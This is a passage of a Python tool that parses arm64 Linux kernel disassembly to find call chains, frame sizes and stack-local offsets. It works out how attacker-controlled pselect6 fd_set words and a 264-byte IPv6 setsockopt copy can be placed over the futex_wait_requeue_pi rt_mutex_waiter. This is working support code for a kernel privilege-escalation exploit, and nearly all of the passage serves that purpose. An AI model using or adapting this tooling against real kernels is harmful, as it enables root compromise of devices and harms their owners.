        dis["pselect_wrapper"], unique_offset(symbols, names["pselect_dispatch"])
    ):
        if not has_direct_call(dis["pselect_dispatch"], pselect_core_addr):
            raise ExtractError("do_pselect does not directly call core_sys_select")
        pselect_chain.append("pselect_dispatch")
    else:
        raise ExtractError(
            "__arm64_sys_pselect6 calls neither core_sys_select nor do_pselect"
        )
    pselect_chain.append("pselect_core")

    futex_chain = ["futex_wrapper"]
    futex_wait_addr = unique_offset(symbols, names["futex_wait"])
    if has_direct_call(dis["futex_wrapper"], futex_wait_addr):
        pass
    elif has_direct_call(
        dis["futex_wrapper"], unique_offset(symbols, names["futex_dispatch"])
    ):
        if not has_direct_call(dis["futex_dispatch"], futex_wait_addr):
            raise ExtractError(
                "do_futex does not directly call futex_wait_requeue_pi"
            )
        futex_chain.append("futex_dispatch")
    else:
        raise ExtractError(
            "__arm64_sys_futex calls neither do_futex nor futex_wait_requeue_pi"
        )
    futex_chain.append("futex_wait")

    for caller_key, callee_key in zip(pselect_chain, pselect_chain[1:]):
        validate_frame_live_at(
            dis[caller_key],
            rf"\bbl\s+0x{unique_offset(symbols, names[callee_key]):x}\b",
            names[caller_key],
        )
    for caller_key, callee_key in zip(futex_chain, futex_chain[1:]):
        validate_frame_live_at(
            dis[caller_key],
            rf"\bbl\s+0x{unique_offset(symbols, names[callee_key]):x}\b",
            names[caller_key],
        )
    frames = {key: first_sp_frame(text, names[key]) for key, text in dis.items()}

    pi_tree = wake_state = task = None
    if btf is not None:
        pi_tree = btf.field("rt_mutex_waiter", "pi_tree")
        if pi_tree is None:
            pi_tree = btf.field("rt_mutex_waiter", "pi_tree_entry")
        wake_state = btf.field("rt_mutex_waiter", "wake_state")
        task = btf.field("rt_mutex_waiter", "task")
        if pi_tree is None or wake_state is None:
            raise ExtractError("BTF rt_mutex_waiter.pi_tree/wake_state missing")
    waiter_candidates: list[tuple[str, int]] = []
    for reg, imm_text in re.findall(
        r"\badd\s+(x\d+),\s*sp,\s*#0x([0-9a-f]+)", dis["futex_wait"], re.I
    ):
        imm = int(imm_text, 16)
        if pi_tree is not None:
            if re.search(
                rf"\badd\s+x\d+,\s*{re.escape(reg)},\s*#0x{pi_tree:x}\b",
                dis["futex_wait"], re.I,
            ):
                waiter_candidates.append((reg.lower(), imm))
        elif re.search(
            rf"\bstp\s+xzr,\s*xzr,\s*\[sp,\s*#0x{imm:x}\]",
            dis["futex_wait"], re.I,
        ):
            # No BTF: the waiter is memset before use, so its sp slot must
            # start a stp xzr run; require that.
            waiter_candidates.append((reg.lower(), imm))
    # Several registers may materialize the same sp local; dedupe by offset.
    waiter_candidates = list(
        {imm: (reg, imm) for reg, imm in waiter_candidates}.values()
    )
    # 5.15-era kernels also build a futex_q on the stack whose embedded
    # plist/list node matches the pi_tree add pattern (e.g. sp+0x8 with
    # node_list at +0x18). rt_mutex_init_waiter is distinctive: it stores
    # the waiter's own address into tree_entry.__rb_parent_color (base+0)
    # and NULL into waiter->task (base+task). Require one of those stores
    # when the pi_tree pattern alone is ambiguous.
    if len(waiter_candidates) > 1 and pi_tree is not None and task is not None:
        narrowed: list[tuple[str, int]] = []
        for reg, imm in waiter_candidates:
            zero_task = re.search(
                rf"\bstr\s+xzr,\s*\[sp,\s*#0x{imm + task:x}\]",
                dis["futex_wait"], re.I,
            )
            self_link = re.search(
                rf"\bstr\s+{re.escape(reg)},\s*\[sp,\s*#0x{imm:x}\]",
                dis["futex_wait"], re.I,
            )
            if zero_task or self_link:
                narrowed.append((reg, imm))
        if narrowed:
            waiter_candidates = narrowed
    if len(waiter_candidates) != 1:
        raise ExtractError(
            f"futex waiter stack local not unique: {waiter_candidates}"
        )
    waiter_reg, waiter_local = waiter_candidates[0]
    validate_frame_live_at(
        dis["futex_wait"],
        rf"\badd\s+{re.escape(waiter_reg)},\s*sp,\s*#0x{waiter_local:x}\b",
        names["futex_wait"],
    )
    required_fields = [waiter_local]
    if wake_state is not None:
        required_fields.append(waiter_local + wake_state)
    for required in required_fields:
        if not re.search(rf"\[sp,\s*#0x{required:x}\]", dis["futex_wait"], re.I):
            raise ExtractError(
                f"futex waiter candidate 0x{waiter_local:x} not cross-validated "
                f"by a real field store at 0x{required:x}"
            )

    add_sp: list[tuple[str, int]] = [
        (reg.lower(), int(imm, 16))
        for reg, imm in re.findall(
            r"\badd\s+(x\d+),\s*sp,\s*#0x([0-9a-f]+)",
            dis["pselect_core"], re.I,
        )
    ]
    buffer_candidates: set[int] = set()
    for reg, imm in add_sp:
        peers = {peer for peer, peer_imm in add_sp if peer_imm == imm and peer != reg}
        if any(
            re.search(rf"\bcmp\s+{re.escape(reg)},\s*{re.escape(peer)}\b",
                      dis["pselect_core"], re.I)
            or re.search(rf"\bcmp\s+{re.escape(peer)},\s*{re.escape(reg)}\b",
                         dis["pselect_core"], re.I)
            for peer in peers
        ):
            buffer_candidates.add(imm)
    if len(buffer_candidates) != 1:
        raise ExtractError(
            f"core_sys_select fd_set buffer candidates not unique: "
            f"{sorted(hex(v) for v in buffer_candidates)}"
        )
    pselect_buffer = next(iter(buffer_candidates))
    buffer_regs = sorted({
        reg for reg, imm in add_sp
        if imm == pselect_buffer
    })
    if not buffer_regs:
        raise ExtractError("core_sys_select stack buffer has no output register")
    for buffer_reg in buffer_regs:
        validate_frame_live_at(
            dis["pselect_core"],
            rf"\badd\s+{re.escape(buffer_reg)},\s*sp,\s*#0x{pselect_buffer:x}\b",
            f"{names['pselect_core']}/{buffer_reg}",
        )

    fds_bytes = ((route_nfds + 63) // 64) * 8
    thresholds = [
        int(value, 16)
        for value in re.findall(r"\bcmp\s+x\d+,\s*#0x([0-9a-f]+)",
                                dis["pselect_core"], re.I)
    ]
    if not any(fds_bytes < threshold <= fds_bytes + 8 for threshold in thresholds):
        raise ExtractError(
            f"core_sys_select threshold does not prove route_nfds={route_nfds} "
            f"uses the stack fd_set path"
        )

    pselect_word0 = -sum(frames[key] for key in pselect_chain) + pselect_buffer
    futex_waiter = -sum(frames[key] for key in futex_chain) + waiter_local
    delta = futex_waiter - pselect_word0
    if delta < 0 or delta % 8:
        raise ExtractError(f"pselect/futex overlap is not a non-negative qword: {delta}")
    shift = delta // 8
    if shift > 16:
        raise InfeasibleError(
            f"PSELECT_WAITER_WORD_SHIFT too large: {shift}"
        )
    # Feasibility: core_sys_select copies 3 x FDS_BYTES(route_nfds) fd_set
    # qwords (0..14 for nfds=320); the waiter lock at qword shift+11 must fit
    # inside, else task/lock land in the zeroed tail and the route cannot work.
    if shift > 3:
        raise InfeasibleError(
            f"futex waiter starts {shift} qwords above the fd_set buffer; "
            f"task/lock would land outside the user-controlled words 0..14 "
            f"(max feasible shift is 3)"
        )
    if shift == 3:
        print(
            "warning: waiter fits at the last usable word (shift=3); "
            "wake_state falls outside the copied fd_set and relies on the "
            "kernel zero-initialising it",
            file=sys.stderr,
        )
    return {
        "PSELECT_WAITER_WORD_SHIFT": shift,
        "waiter_local": waiter_local,
        "pselect_word0": pselect_word0,
        "futex_waiter": futex_waiter,
        "pselect_buffer": pselect_buffer,
        "chain": "->".join(names[key] for key in pselect_chain),
        "futex_chain": "->".join(names[key] for key in futex_chain),
        **{f"frame_{key}": frames[key] for key in frames},
    }


MCAST_COPY_LEN = 0x108
MCAST_ROUTE_OPTNAME = 46
MCAST_SWITCH_INDEX = MCAST_ROUTE_OPTNAME - 1
MCAST_SOCKET_SYMBOLS = [
    "__arm64_sys_setsockopt", "__sys_setsockopt", "do_sock_setsockopt",
    "sock_setsockopt", "sk_setsockopt", "sock_common_setsockopt",
    "udpv6_setsockopt", "rawv6_setsockopt",
    "ipv6_setsockopt", "udp_lib_setsockopt", "do_ipv6_setsockopt",
]


def chain_frame_size(text: str, name: str) -> int:
    """Total stack allocated at function entry. arm64 kernels allocate with
    `sub sp, sp, #imm`, the pre-indexed `stp x29, x30, [sp, #-imm]!` save, or
    both (do_ipv6_setsockopt uses stp -0x60 followed by sub -0x260)."""
    sub = re.search(r"\bsub\s+sp,\s*sp,\s*#0x([0-9a-f]+)", text, re.I)
    stp = re.search(
        r"\bstp\s+x29,\s*x30,\s*\[sp,\s*#-(0x[0-9a-f]+)\]", text, re.I
    )
    total = (int(sub.group(1), 16) if sub else 0) + (
        int(stp.group(1), 16) if stp else 0
    )
    if not total:
        raise ExtractError(f"{name} has no explicit frame allocation")
    return total


def _direct_call_targets(text: str) -> set[int]:
    return {
        int(addr, 16)
        for addr in re.findall(r"\bbl\s+0x([0-9a-f]+)", text, re.I)
    }


def _follow_direct(
    text: str, symbols: dict[str, set[int]], candidates: list[str]
) -> str:
    """First candidate whose unique address is a direct bl target of text."""
    calls = _direct_call_targets(text)
    for candidate in candidates:
        address = unique_offset_optional(symbols, candidate)
        if address is not None and address in calls:
            return candidate
    raise ExtractError(
        f"no direct call to any of {candidates} "
        f"(calls: {sorted(hex(c) for c in calls)[:8]})"
    )


def _asm_instructions(text: str) -> list[dict[str, object]]:
    """Parse llvm-objdump lines into {addr, mn, ops, raw} records."""
    instructions: list[dict[str, object]] = []
    for line in text.splitlines():
        match = re.match(
            r"^\s*([0-9a-f]+):\s+(?:[0-9a-f]{2,8}\s+)?(\S+)(?:\s+(.*))?$",
            line,
        )
        if not match:
            continue
        ops = (match.group(3) or "").strip()
        ops = re.sub(r"\s+<.*>$", "", ops)
        instructions.append({
            "addr": int(match.group(1), 16),
            "mn": match.group(2),
            "ops": ops,
            "raw": line.strip(),
        })
    if not instructions:
        raise ExtractError("empty disassembly")
    return instructions


def _branch_target(instruction: dict[str, object]) -> int | None:
    match = re.search(r"(?<![#\w])0x([0-9a-f]+)", instruction["ops"])
    return int(match.group(1), 16) if match else None


def _apply_sp_operation(
    instruction: dict[str, object], depth: int, allocated: bool, name: str
) -> tuple[int, bool]:
    """Apply the instruction's effect on the live frame size below the
    function entry SP and return (new_depth, allocated_seen). depth grows
    when SP moves down (`sub sp` / pre-indexed stores). Raises on unhandled
    SP modifications."""
    mn = instruction["mn"]
    ops = instruction["ops"]
    imm = re.match(r"^sp,\s*sp,\s*#(0x[0-9a-f]+)$", ops, re.I)
    if mn == "sub" and imm:
        return depth + int(imm.group(1), 16), True
    if mn == "add" and imm:
        return depth - int(imm.group(1), 16), allocated
    pre_stp = re.match(
        r"^([xw]\d+),\s*([xw]\d+),\s*\[sp,\s*#-(0x[0-9a-f]+)\]!$",
        ops, re.I,
    )
    if mn == "stp" and pre_stp:
        return depth + int(pre_stp.group(3), 16), True
    pre_str = re.match(
        r"^([xw]\d+),\s*\[sp,\s*#-(0x[0-9a-f]+)\]!$", ops, re.I,
    )
    if mn == "str" and pre_str:
        return depth + int(pre_str.group(2), 16), True
    post_ldp = re.match(
        r"^([xw]\d+),\s*([xw]\d+),\s*\[sp\],\s*#(0x[0-9a-f]+)$",
        ops, re.I,
    )
    if mn == "ldp" and post_ldp:
        return depth - int(post_ldp.group(3), 16), allocated
    post_ldr = re.match(
        r"^([xw]\d+),\s*\[sp\],\s*#(0x[0-9a-f]+)$", ops, re.I,
    )
    if mn == "ldr" and post_ldr:
        return depth - int(post_ldr.group(2), 16), allocated
    if re.match(r"^sp\s*(,|$)", ops, re.I) and mn in ("mov", "add", "sub"):
        raise ExtractError(
            f"{name}: unhandled SP modification `{mn} {ops}`"
        )
    return depth, allocated


def _successors(
    instructions: list[dict[str, object]],
    index: int,
    kernel: bytes | None,
    name: str,
) -> list[int]:
    """CFG successors of instruction index; calls fall through and `br xN`
    follows the resolved switch table when the standard
    adrp+add table / adr base / ldrsw / add / br pattern is present."""
    instruction = instructions[index]
    mn = instruction["mn"]
    if mn in ("ret", "eret"):
        return []
    if mn == "br":
        targets = _jump_table_targets(instructions, index, kernel, name)
        if targets is None:
            return []
        resolved: list[int] = []
        for target in targets:
            match = _address_index_optional(instructions, target)
            if match is not None:
                resolved.append(match)
        if not resolved:
            raise ExtractError(
                f"{name}: switch table at 0x{instruction['addr']:x} "
                "resolves to no instruction"
            )
        return resolved
    if mn == "b":
        target = _branch_target(instruction)
        if target is None:
            raise ExtractError("unconditional b without target")
        return [_index_of_address(instructions, target)]
    conditional = mn.startswith("b.") or mn in ("cbz", "cbnz", "tbz", "tbnz")
    if conditional:
        target = _branch_target(instruction)
        successors = [index + 1] if index + 1 < len(instructions) else []
        if target is not None:
            successors.append(_index_of_address(instructions, target))
        return successors
    return [index + 1] if index + 1 < len(instructions) else []


def _jump_table_targets(
    instructions: list[dict[str, object]],
    index: int,
    kernel: bytes | None,
    name: str,
) -> list[int] | None:
    """Resolve `br xN` switch targets. Returns None when the instruction is
    not the tail of the standard dispatch pattern."""
    if kernel is None:
        return None
    match = re.match(r"([xw]\d+)", instructions[index]["ops"])
    if match is None:
        return None
    register = match.group(1)
    for j in range(max(0, index - 8), index):
        add = (
            re.match(
                rf"{register},\s*{register},\s*(x\d+)",
                instructions[j]["ops"], re.I,
            )
            if instructions[j]["mn"] == "add"
            else None
        )
        if add is None:
            continue
        offset_reg = add.group(1)
        for k in range(max(0, j - 8), j):
            load = (
                re.match(
                    rf"{offset_reg},\s*\[(x\d+),\s*(x\d+),\s*lsl\s*#2\]",
                    instructions[k]["ops"], re.I,
                )
                if instructions[k]["mn"] == "ldrsw"
                else None
            )
            if load is None:
                continue
            table_reg = load.group(1)
            index_reg = load.group(2)
            table: int | None = None
            for l in range(max(0, k - 8), k):
                page = (
                    re.match(
                        rf"{table_reg},\s*0x([0-9a-f]+)",
                        instructions[l]["ops"], re.I,
                    )
                    if instructions[l]["mn"] == "adrp"
                    else None
                )
                if page is None:
                    continue
                for l2 in range(l + 1, min(len(instructions), l + 4)):
                    addoff = (
                        re.match(
                            rf"{table_reg},\s*{table_reg},\s*#0x([0-9a-f]+)",
                            instructions[l2]["ops"], re.I,
                        )
                        if instructions[l2]["mn"] == "add"
                        else None
                    )
                    if addoff is not None:
                        table = (int(page.group(1), 16) & ~0xFFF) + int(
                            addoff.group(1), 16
                        )
                        break
                if table is not None:
                    break
            if table is None:
                continue
            base: int | None = None
            for l in range(max(0, j - 8), j):
                adr = (
                    re.match(
                        rf"{register},\s*0x([0-9a-f]+)",
                        instructions[l]["ops"], re.I,
                    )
                    if instructions[l]["mn"] == "adr"
                    else None
                )
                if adr is not None:
                    base = int(adr.group(1), 16)
                    break
            if base is None:
                continue
            # Entry count: the `cmp wI, #imm; b.hi` guard immediately before
            # the dispatch bounds the table; fall back to a generous cap.
            bound: int | None = None
            w_index = "w" + index_reg[1:]
            for l in range(max(0, index - 16), index):
                cmp_match = (
                    re.match(
                        rf"{w_index},\s*#0x([0-9a-f]+)",
                        instructions[l]["ops"], re.I,
                    )
                    if instructions[l]["mn"] == "cmp"
                    else None
                )
                if cmp_match is not None:
                    bound = int(cmp_match.group(1), 16) + 1
                    break
            if bound is None:
                bound = 0x100
            targets: list[int] = []
            for entry in range(bound):
                table_entry = table + 4 * entry
                if table_entry + 4 > len(kernel):
                    break
                offset = _u32(kernel, table_entry)
                signed = offset - 0x100000000 if offset >= 0x80000000 else offset
                targets.append(base + signed)
            if not targets:
                raise ExtractError(
                    f"{name}: switch table 0x{table:x} empty"
                )
            return targets
    return None


def _address_index_optional(
    instructions: list[dict[str, object]], address: int
) -> int | None:
    for index, instruction in enumerate(instructions):
        if instruction["addr"] == address:
            return index
    return None


def _index_of_address(
    instructions: list[dict[str, object]], address: int
) -> int:
    for index, instruction in enumerate(instructions):
        if instruction["addr"] == address:
            return index
    raise ExtractError(f"branch target 0x{address:x} not an instruction")


def sp_depth_at_anchor(
    text: str, anchor: str, name: str, kernel: bytes | None = None,
) -> int:
    """Walk the function CFG from entry and return the frame SP depth at the
    unique instruction matching `anchor`. All reaching paths must agree on
    the depth; the anchor must be reachable with at least one allocation."""
    instructions = _asm_instructions(text)
    anchors = [
        index for index, instruction in enumerate(instructions)
        if re.search(anchor, instruction["raw"], re.I)
    ]
    if len(anchors) != 1:
        raise ExtractError(
            f"{name}: anchor not unique in {len(anchors)} places"
        )
    target = anchors[0]
    states: dict[int, tuple[int, bool]] = {}
    states[0] = (0, False)
    queue = [0]
    while queue:
        index = queue.pop(0)
        if index >= target:
            continue
        depth, allocated = states[index]
        depth, allocated = _apply_sp_operation(
            instructions[index], depth, allocated, name
        )
        for successor in _successors(instructions, index, kernel, name):
            state = (depth, allocated)
            if successor not in states:
                states[successor] = state
                queue.append(successor)
            elif states[successor] != state:
                raise ExtractError(
                    f"{name}: SP depth diverges at "
                    f"0x{instructions[successor]['addr']:x}"
                )
    if target not in states:
        raise ExtractError(f"{name}: anchor unreachable from entry")
    depth, allocated = states[target]
    if not allocated:
        raise ExtractError(
            f"{name}: no frame allocation on the path to the anchor"
        )
    if depth < 0:
        raise ExtractError(f"{name}: negative SP depth at anchor: {depth:#x}")
    return depth


def _futex_waiter_local(
    text: str, btf: Btf | None, name: str
) -> int:
    """Locate futex_wait_requeue_pi's stack rt_mutex_waiter local."""
    pi_tree = wake_state = task = None
    if btf is not None:
        pi_tree = btf.field("rt_mutex_waiter", "pi_tree")
        if pi_tree is None:
            pi_tree = btf.field("rt_mutex_waiter", "pi_tree_entry")
        wake_state = btf.field("rt_mutex_waiter", "wake_state")
        task = btf.field("rt_mutex_waiter", "task")
    candidates: list[tuple[str, int]] = [
        (match.group(1).lower(), int(match.group(2), 16))
        for match in re.finditer(
            r"\badd\s+(x\d+),\s*sp,\s*#0x([0-9a-f]+)", text, re.I
        )
    ]
    candidates = list(
        {imm: (reg, imm) for reg, imm in candidates}.values()
    )
    if len(candidates) > 1 and pi_tree is not None and task is not None:
        narrowed: list[tuple[str, int]] = []
        for reg, imm in candidates:
            zero_task = re.search(
                rf"\bstr\s+xzr,\s*\[sp,\s*#0x{imm + task:x}\]",
                text, re.I,
            )
            self_link = re.search(
                rf"\bstr\s+{re.escape(reg)},\s*\[sp,\s*#0x{imm:x}\]",
                text, re.I,
            )
            if zero_task or self_link:
                narrowed.append((reg, imm))
        if narrowed:
            candidates = narrowed
    if len(candidates) != 1:
        raise ExtractError(
            f"futex waiter stack local not unique: {candidates}"
        )
    _, waiter_local = candidates[0]
    required = [waiter_local]
    if wake_state is not None:
        required.append(waiter_local + wake_state)
    for offset in required:
        if not re.search(
            rf"\[sp,\s*#0x{offset:x}\]", text, re.I
        ):
            raise ExtractError(
                f"futex waiter candidate 0x{waiter_local:x} not "
                f"cross-validated by a real field store at 0x{offset:x}"
            )
    return waiter_local


def derive_futex_chain(
    tool: str,
    kernel_path: Path,
    symbols: dict[str, set[int]],
    sorted_offsets: list[int],
    btf: Btf | None,
    kernel: bytes | None = None,
) -> dict[str, object]:
    """Derive the futex chain, its entry frames and the stack waiter local,
    anchored at the syscall entry SP (absolute = -sum(frames) + local)."""
    names = {
        "futex_wrapper": "__arm64_sys_futex",
        "futex_dispatch": "do_futex",
        "futex_wait": "futex_wait_requeue_pi",
    }
    present = {
        key: value
        for key, value in names.items()
        if unique_offset_optional(symbols, value) is not None
    }
    if "futex_wait" not in present:
        raise ExtractError("futex_wait_requeue_pi missing from kallsyms")
    dis = {
        key: disassemble_symbol(
            tool, kernel_path, symbols, sorted_offsets, value
        )
        for key, value in present.items()
    }
    chain = ["futex_wrapper"]
    wait_addr = unique_offset(symbols, names["futex_wait"])
    if has_direct_call(dis["futex_wrapper"], wait_addr):
        chain.append("futex_wait")
    elif "futex_dispatch" in present and has_direct_call(
        dis["futex_wrapper"],
        unique_offset(symbols, names["futex_dispatch"]),
    ):
        if not has_direct_call(dis["futex_dispatch"], wait_addr):
            raise ExtractError(
                "do_futex does not directly call futex_wait_requeue_pi"
            )
        chain += ["futex_dispatch", "futex_wait"]
    else:
        raise ExtractError(
            "__arm64_sys_futex calls neither do_futex nor futex_wait_requeue_pi"
        )
    hop_depths: dict[str, int] = {}
    for caller, callee in zip(chain, chain[1:]):
        hop_depths[names[caller]] = sp_depth_at_anchor(
            dis[caller],
            rf"\bbl\s+0x{unique_offset(symbols, names[callee]):x}\b",
            names[caller], kernel,
        )
    frames = {
        key: chain_frame_size(dis[key], names[key]) for key in chain
    }
    waiter_local = _futex_waiter_local(
        dis["futex_wait"], btf, names["futex_wait"]
    )
    frame_sum = sum(hop_depths.values()) + frames["futex_wait"]
    return {
        "chain": "->".join(names[key] for key in chain),
        "frames": {names[key]: frames[key] for key in chain},
        "hop_depths": hop_depths,
        "frame_sum": frame_sum,
        "waiter_local": waiter_local,
        "waiter_abs": -frame_sum + waiter_local,
    }


def derive_setsockopt_chain(
    tool: str,
    kernel_path: Path,
    symbols: dict[str, set[int]],
    sorted_offsets: list[int],
    btf: Btf | None = None,
    kernel: bytes | None = None,
) -> dict[str, object]:
    """Follow the SOL_IPV6 setsockopt chain to do_ipv6_setsockopt for an
    AF_INET6 DGRAM (UDPv6) socket:

    __arm64_sys_setsockopt -> __sys_setsockopt
      -> sock->ops->setsockopt (sock_common_setsockopt, indirect blr)
      -> sk->sk_prot->setsockopt (udpv6_setsockopt, indirect blr)
      -> [ipv6_setsockopt] -> do_ipv6_setsockopt

    Per-hop stack depth is measured at the actual call site so callers that
    restore SP before the dispatch (e.g. readmik70 __sys_setsockopt) still
    produce the exact live depth at do_ipv6_setsockopt."""
    present = [
        name for name in MCAST_SOCKET_SYMBOLS
        if unique_offset_optional(symbols, name) is not None
    ]
    dis = {
        name: disassemble_symbol(
            tool, kernel_path, symbols, sorted_offsets, name
        )
        for name in present
    }
    chain = ["__arm64_sys_setsockopt"]
    sys_name = _follow_direct(
        dis[chain[0]], symbols, ["__sys_setsockopt"]
    )
    chain.append(sys_name)
    ops_caller = sys_name
    if (
        "do_sock_setsockopt" in dis
        and has_direct_call(
            dis[sys_name], unique_offset(symbols, "do_sock_setsockopt")
        )
    ):
        # 6.x shape: __sys_setsockopt -> do_sock_setsockopt, which switches
        # on level and reaches sock->ops->setsockopt for SOL_IPV6.
        chain.append("do_sock_setsockopt")
        ops_caller = "do_sock_setsockopt"
    if "sock_common_setsockopt" not in dis:
        raise ExtractError(
            "sock_common_setsockopt missing from kallsyms; "
            "cannot model the SOL_IPV6 ops->setsockopt hop"
        )
    chain.append("sock_common_setsockopt")
    proto = "udpv6_setsockopt" if "udpv6_setsockopt" in dis else "rawv6_setsockopt"
    chain.append(proto)
    current = proto
    dipv6 = unique_offset(symbols, "do_ipv6_setsockopt")
    for _ in range(3):
        if dipv6 in _direct_call_targets(dis[current]):
            chain.append("do_ipv6_setsockopt")
            break
        next_name = None
        for candidate in ("ipv6_setsockopt", "udp_lib_setsockopt"):
            address = unique_offset_optional(symbols, candidate)
            if (
                candidate in dis
                and candidate != current
                and address is not None
                and address in _direct_call_targets(dis[current])
            ):
                next_name = candidate
                break
        if next_name is None:
            raise ExtractError(
                "setsockopt chain from "
                f"{current} does not reach do_ipv6_setsockopt"
            )
        chain.append(next_name)
        current = next_name
    else:
        raise ExtractError("setsockopt chain is too deep")

    member_off = btf.field("proto_ops", "setsockopt") if btf else None
    if member_off is None:
        member_off = 0x70
    anchors: dict[tuple[str, str], str] = {}
    for caller, callee in zip(chain, chain[1:]):
        if (
            callee != "sock_common_setsockopt"
            and callee != proto
            and has_direct_call(
                dis[caller], unique_offset(symbols, callee)
            )
        ):
            anchors[(caller, callee)] = (
                rf"\bbl\s+0x{unique_offset(symbols, callee):x}\b"
            )
    anchors[(ops_caller, "sock_common_setsockopt")] = _indirect_dispatch_anchor(
        dis[ops_caller], member_off, ops_caller,
    )
    anchors[("sock_common_setsockopt", proto)] = _indirect_dispatch_anchor(
        dis["sock_common_setsockopt"], None, "sock_common_setsockopt",
    )
    hop_depths: dict[str, int] = {}
    for (caller, callee), anchor in anchors.items():
        hop_depths[f"{caller}->{callee}"] = sp_depth_at_anchor(
            dis[caller], anchor, caller, kernel,
        )
    frames = {name: chain_frame_size(dis[name], name) for name in chain}
    frame_sum = (
        sum(hop_depths.values())
        + chain_frame_size(dis["do_ipv6_setsockopt"], "do_ipv6_setsockopt")
    )
    return {
        "chain": "->".join(chain),
        "frames": frames,
        "hop_depths": hop_depths,
        "frame_sum": frame_sum,
        "dis": dis,
    }


def _indirect_dispatch_anchor(
    text: str, member_off: int | None, name: str
) -> str:
    """Anchor regex for the indirect dispatch call. When the caller has more
    than one blr, resolve the one whose target register was loaded from
    [xN, #member_off] (e.g. proto_ops.setsockopt)."""
    instructions = _asm_instructions(text)
    blrs = [
        index for index, instruction in enumerate(instructions)
        if instruction["mn"] == "blr"
    ]
    if not blrs:
        raise ExtractError(f"{name}: no blr dispatch found")
    if len(blrs) == 1:
        return r"\bblr\b"
    if member_off is None:
        raise ExtractError(
            f"{name}: {len(blrs)} blrs and no member offset to disambiguate"
        )
    matches: list[int] = []
    for index in blrs:
        reg = re.match(r"([xw]\d+)", instructions[index]["ops"])
        if reg is None:
            continue
        register = reg.group(1)
        for j in range(max(0, index - 16), index):
            if instructions[j]["mn"] == "ldr" and re.search(
                rf"{register},\s*\[x\d+,\s*#0x{member_off:x}\]",
                instructions[j]["ops"], re.I,
            ):
                matches.append(index)
                break
    if len(matches) != 1:
        raise ExtractError(
            f"{name}: cannot disambiguate the dispatch blr "
            f"(blrs={len(blrs)} member_load_matches={len(matches)})"
        )
    return rf"\bblr\s+{register}\b"


def _find_mcast_copy_sites(text: str) -> list[tuple[int, int]]:
    """All (copy_off, instruction_address) pairs where do_ipv6_setsockopt
    copies MCAST_COPY_LEN bytes onto the stack."""
    sites: list[tuple[int, int]] = []
    lines = text.splitlines()
    for index, line in enumerate(lines):
        if not re.search(r"\bmov\s+w\d+,\s*#0x108\b", line, re.I):
            continue
        head = re.match(r"^\s*([0-9a-f]+):", line)
        if not head:
            continue
        site_addr = int(head.group(1), 16)
        for j in range(max(0, index - 8), min(len(lines), index + 8)):
            match = re.search(
                r"\badd\s+(x\d+),\s*sp,\s*#0x([0-9a-f]+)",
                lines[j], re.I,
            )
            if match:
                sites.append((int(match.group(2), 16), site_addr))
                break
    return sites


def _resolve_mcast_case(
    kernel: bytes, text: str, sites: list[tuple[int, int]]
) -> dict[str, int]:
    """Resolve the optname switch in do_ipv6_setsockopt and pick the 264-byte
    copy site reached by optname 46 (0-based case index 45)."""
    lines = text.splitlines()
    switch = None
    for index, line in enumerate(lines):
        match = re.match(
            r"^\s*[0-9a-f]+:\s+(?:[0-9a-f]{2,8}\s+)?"
            r"cmp\s+w([0-9]+),\s*#0x([0-9a-f]+)\b",
            line, re.I,
        )
        if not match:
            continue
        index_reg = match.group(1)
        max_value = int(match.group(2), 16)
        # The optname guard is `cmp wI, #imm; b.cond` straight into the
        # table setup. Older false positives (e.g. the AF_INET6 family
        # check `cmp w8, #0xa`) are followed by unrelated work, not by a
        # conditional branch, so require one right after the cmp.
        if index + 1 >= len(lines) or not re.search(
            r"\bb\.(hi|hs|lo|ls|ge|gt|le|lt|eq|ne)\b",
            lines[index + 1], re.I,
        ):
            continue
        window = "\n".join(lines[index:index + 14])
        table_page = re.search(
            r"\badrp\s+x\d+,\s*0x([0-9a-f]+)\b", window, re.I
        )
        table_add = re.search(
            r"\badd\s+x\d+,\s*x\d+,\s*#0x([0-9a-f]+)\b", window, re.I
        )
        # Some 5.15 kernels index the switch table with the 64-bit form
        # (`ldrsw xN, [xT, xI, lsl #2]`) while the guard compares the
        # 32-bit pair (`cmp wI, #imm`); accept either.
        loadsw = re.search(
            rf"\bldrsw\s+x\d+,\s*\[x\d+,\s*[wx]{index_reg},\s*lsl\s*#2\]",
            window, re.I,
        )
        adr_base = re.search(
            r"\badr\s+x\d+,\s*0x([0-9a-f]+)\b", window, re.I
        )
        branch = re.search(r"\bbr\s+x\d+\b", window, re.I)
        if table_page and table_add and loadsw and adr_base and branch:
            # The guard register must not be rewritten between the cmp and
            # the table setup: real switches keep the `sub wI, wM, #1`
            # index until the `br`, while unrelated cmps are followed by a
            # fresh index computation (e.g. `sub w8, w20, #0x1` after the
            # family check) that would break the mapping.
            adrp_line = next(
                (
                    window_index for window_index, window_line
                    in enumerate(lines[index:index + 14])
                    if re.search(
                        r"\badrp\s+x\d+,\s*0x[0-9a-f]+\b",
                        window_line, re.I,
                    )
                ),
                None,
            )
            if adrp_line is None:
                continue
            rewritten = False
            for between in lines[index + 2:index + adrp_line]:
                if re.search(
                    rf"\b[a-z]+(?:\.[a-z0-9]+)?\s+[wx]{index_reg}\s*,",
                    between, re.I,
                ):
                    rewritten = True
                    break
            if rewritten:
                continue
            table = (int(table_page.group(1), 16) & ~0xFFF) + int(
                table_add.group(1), 16
            )
            base = int(adr_base.group(1), 16)
            switch = {"table": table, "base": base, "max": max_value}
            break
    if switch is None:
        raise ExtractError(
            "cannot locate the optname switch in do_ipv6_setsockopt"
        )
    table, base, max_value = (
        switch["table"], switch["base"], switch["max"]
    )
    if table + 4 * (max_value + 1) > len(kernel):
        raise ExtractError(
            f"switch table 0x{table:x} exceeds kernel image"
        )
    cases = [
        base + _u32(kernel, table + 4 * index)
        for index in range(max_value + 1)
    ]
    best: tuple[int, int, int] | None = None
    for copy_off, site_addr in sites:
        for index, case_addr in enumerate(cases):
            # The switch case lands at the case block entry (often a `bti j`
            # immediately before the `add x0, sp, #off` / `mov wN, #0x108`
            # sequence), so accept a small window around the copy site.
            if abs(case_addr - site_addr) > 16:
                continue
            # Several optnames may share one handler (vendors often alias
            # adjacent values into the same case), so keep scanning for the
            # exact optname-46 slot instead of settling on the first hit.
            if index == MCAST_SWITCH_INDEX:
                best = (index, copy_off, site_addr)
                break
            if best is None:
                best = (index, copy_off, site_addr)
    if best is None:
        raise ExtractError(
            "no 264-byte copy site maps to an optname switch case "
            f"(sites={[(hex(off), hex(addr)) for off, addr in sites]})"
        )
    index, copy_off, site_addr = best
    if index != MCAST_SWITCH_INDEX:
        print(
            f"warning: mcast 264-byte copy is switch case {index}, "
